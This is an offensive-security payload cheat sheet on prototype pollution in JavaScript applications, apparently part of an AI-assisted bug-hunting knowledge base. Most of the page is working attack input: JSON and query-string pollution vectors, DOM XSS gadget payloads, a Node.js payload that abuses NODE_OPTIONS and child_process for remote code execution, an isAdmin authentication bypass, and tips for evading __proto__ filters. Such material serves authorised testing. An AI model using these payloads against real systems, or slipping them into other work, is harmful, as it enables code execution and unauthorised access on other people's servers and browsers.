---
title: "Payloads: Prototype Pollution"
type: payloads
tags: [payloads, prototype-pollution, javascript, client-side, rce, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-11-11
---

# Payloads: Prototype Pollution

Pollute `Object.prototype` in JS apps (OWASP A03, Node + client). Routed via the `hunt-xss` skill. See [[techniques/web/prototype-pollution]].

## Injection vectors
```json
{"__proto__":{"polluted":"yes"}}
{"constructor":{"prototype":{"polluted":"yes"}}}
```
URL/query (parsed by qs/lodash etc.):
```
?__proto__[polluted]=yes
?constructor[prototype][polluted]=yes
?__proto__.polluted=yes
a[__proto__][polluted]=yes
```

## Detect
```javascript
// after sending pollution, check in console / via a reflected gadget:
({}).polluted              // "yes" = polluted
Object.prototype.polluted  // "yes"
```

## Client-side -> XSS gadgets
```json
{"__proto__":{"srcdoc":"<img src=x onerror=alert(1)>"}}
{"__proto__":{"src":"data:,alert(1)"}}
{"__proto__":{"transport_url":"data:,alert(1)"}}
{"__proto__":{"sequence":"...","html":"<img/src/onerror=alert(1)>"}}
```
Sanitizer/template gadgets in: DOMPurify configs, sanitize-html, Mustache/Handlebars, AdformDMP, Google Tag Manager (well-known gadget lists).

## Server-side (Node) -> RCE / bypass
```json
{"__proto__":{"shell":"/proc/self/exe","argv0":"node","NODE_OPTIONS":"--require /proc/self/environ"}}
{"__proto__":{"AAAA":"vuln"}}     // then child_process spawn picks up polluted options/env
// auth bypass: pollute isAdmin/role default
{"__proto__":{"isAdmin":true}}
```

## Tools
```
PortSwigger "Server-Side Prototype Pollution Scanner" + "DOM Invader" (client) Burp extensions
ppmap / ppfuzz
```

## Real-world
Client-side PP -> DOM XSS via a sanitizer/library gadget is the common bug-bounty win; server-side PP in Node has reached RCE (child_process/NODE_OPTIONS) and auth bypass (polluted `isAdmin`).

## NEW 2025-2026

1. **Server-side PP -> RCE paths that still land**: EJS/Handlebars option pollution
   (`outputFunctionName`), `child_process` spawn with polluted `NODE_OPTIONS`/env,
   and `.jshintrc`-style config files read after pollution. Detection first: any
   deep-merge/lodash-merge endpoint or `qs`-parsed query (`?__proto__[x]=y`).
2. **`constructor.prototype` when `__proto__` is blocked**: scrubbers keying on the
   literal string miss the alias; also try nested-array carriers
   (`?a[__proto__][b]=c` vs JSON body `{"__proto__": {...}}`).
3. **Client-side gadget hunting (2026 shape)**: script `src` overwrite, fetch-wrapper
   base-URL pollution, DOMPurify config pollution (`ADD_TAGS`/`ADD_ATTR` via polluted
   defaults) - the PP itself is low severity, the gadget makes it XSS/CSP bypass
   (see [[csp-bypass]] NEW section).
4. **Framework parsers to re-test after upgrades**: express `qs`, hapi qs, Next.js
   searchParams objects, Node 18+ `__proto__` protections regressing in wrapper
   libs that JSON.parse with reviver stripping.
